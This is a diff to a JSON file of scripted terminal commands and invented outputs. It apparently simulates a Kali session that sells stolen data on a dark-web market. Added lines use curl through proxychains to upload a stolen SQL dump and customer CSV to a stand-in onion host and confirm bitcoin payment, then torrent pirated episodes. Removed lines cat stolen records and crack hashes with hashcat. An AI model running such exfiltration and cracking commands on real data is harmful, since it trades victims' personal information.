@@ -2,8 +2,7 @@
     {
         "prompt": "",
         "command": "",
-        "output": [
-            "Booting `Kali GNU/Linux`",
+        "output": ["Booting `Kali GNU/Linux`",
             "",
             "[    0.000000] Linux version 6.1.0-kali3-amd64 (devel@kali.org) (gcc (Debian 12.2.0-14) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali1",
             "[    0.000000] Command line: BOOT_IMAGE=/boot/vmlinuz-6.1.0-kali3-amd64 root=UUID=1234-5678-90AB-CDEF ro quiet splash",
@@ -18,8 +17,7 @@
             "",
             "kali login: kali",
             "Password: ********",
-            "Welcome to Kali GNU/Linux 2024 rolling",
-            "kali@attackbox:~$"
+            "Welcome to Kali GNU/Linux 2024 rolling"
         ]
     },
     {
@@ -910,7 +908,7 @@
     },
     {
         "prompt": "kali@attackbox:~$",
-        "command": "    echo \"darkseller@onionmail.org:securepass123\" > accounts.txt",
+        "command": "echo \"darkseller@onionmail.org:securepass123\" > accounts.txt",
         "output": []
     },
     {
@@ -939,27 +937,65 @@
     },
     {
         "prompt": "kali@attackbox:~$",
-        "command": "cat stolen_data/customer_data.csv",
+        "command": "proxychains curl -X GET http://darkmarket.onion/post/9348c1/replies",
         "output": [
-            "   Name,Email,Phone",
-            "   John Doe,john.doe@example.com,555-1234",
-            "   Jane Smith,jane.smith@example.com,555-5678"
+            "   Reply from Buyer1: 'Interested in the SQL dump and customer data. BTC transferred to your wallet: 1A2b3C4D5E6F7G8H9J0KL'.",
+            "   Reply from Buyer2: 'Payment sent for full dataset. Transaction ID: f1a2b3c4d5e6g7h8i9j0k1l2m3'."
         ]
     },
     {
         "prompt": "kali@attackbox:~$",
-        "command": "cat stolen_data/business_data_dump.sql | grep 'INSERT INTO `users`'",
+        "command": "bitcoin-cli gettransaction f1a2b3c4d5e6g7h8i9j0k1l2m3",
         "output": [
-            "   INSERT INTO `users` VALUES (1,'admin','$2y$10$Ex4mpl3H4sh','admin@example.com');",
-            "   INSERT INTO `users` VALUES (2,'user1','$2y$10$Qx4mpl3Us3r','user1@example.com');"
+            "   {",
+            "     \"amount\": 0.5,",
+            "     \"confirmations\": 6,",
+            "     \"txid\": \"f1a2b3c4d5e6g7h8i9j0k1l2m3\",",
+            "     \"walletconflicts\": [],",
+            "     \"time\": 1699843800,",
+            "     \"details\": [",
+            "       {",
+            "         \"account\": \"\",",
+            "         \"address\": \"1A2b3C4D5E6F7G8H9J0KL\",",
+            "         \"category\": \"receive\",",
+            "         \"amount\": 0.5,",
+            "         \"label\": \"\"",
+            "       }",
+            "     ]",
+            "   }"
         ]
     },
     {
         "prompt": "kali@attackbox:~$",
-        "command": "hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
+        "command": "proxychains curl -X POST -F 'file=@stolen_data/business_data_dump.sql' -F 'file=@stolen_data/customer_data.csv' http://darkmarket.onion/deliver/f1a2b3c4d5e6g7h8i9j0k1l2m3",
         "output": [
-            "   $2y$10$Ex4mpl3H4sh:SuperSecurePassword!",
-            "   $2y$10$Qx4mpl3Us3r:User1Password123!"
+            "   HTTP/1.1 200 OK",
+            "   Delivery successful. Buyer notified."
+        ]
+    },
+    {
+        "prompt": "kali@attackbox:~$",
+        "command": "torify qbittorrent",
+        "output": [
+            "   Starting qBittorrent with Tor proxy..."
+        ]
+    },
+    {
+        "prompt": "qBittorrent@kali:~$",
+        "command": "Search for 'Pokemon complete seasons torrent'",
+        "output": [
+            "   1. Pokemon S01-S10 Complete 1080p [100GB]",
+            "   2. Pokemon All Episodes 720p [75GB]",
+            "   3. Pokemon Latest Episodes 480p [50GB]"
+        ]
+    },
+    {
+        "prompt": "qBittorrent@kali:~$",
+        "command": "Download option 2",
+        "output": [
+            "   Downloading: Pokemon All Episodes 720p [75GB]",
+            "   Progress: 0%... 10%... 50%... 100%",
+            "   Download completed."
         ]
     },
     {
